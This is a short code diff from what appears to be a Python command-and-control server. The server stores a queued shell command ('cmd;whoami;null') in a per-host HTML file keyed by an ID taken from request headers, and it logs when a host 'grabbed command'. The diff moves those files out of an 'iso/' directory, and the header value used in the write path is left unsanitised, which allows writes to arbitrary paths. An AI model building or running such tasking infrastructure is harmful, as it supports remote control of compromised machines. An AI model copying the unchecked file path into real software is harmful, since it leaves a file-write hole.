@@ -55,7 +55,7 @@ def home():
         message = "cmd;whoami;null "
         print(f'headers:{val}')
         # create a new page for the UUID we got from the headers
-        with open(f"iso/{val}.html", "w") as f:
+        with open(f"{val}.html", "w") as f:
             f.write(message)
         return ('')
 
@@ -68,7 +68,7 @@ def index(filename):
         print(f'Host {bID} grabbed command')
         bID = str(bID)
         bID = re.sub('[^A-Za-z0-9]+', '', bID) # We are removing special characters
-        with open(f'iso/{bID}.html') as f:
+        with open(f'{bID}.html') as f:
             content = f.readlines()
         for line in content:
             cmd = line
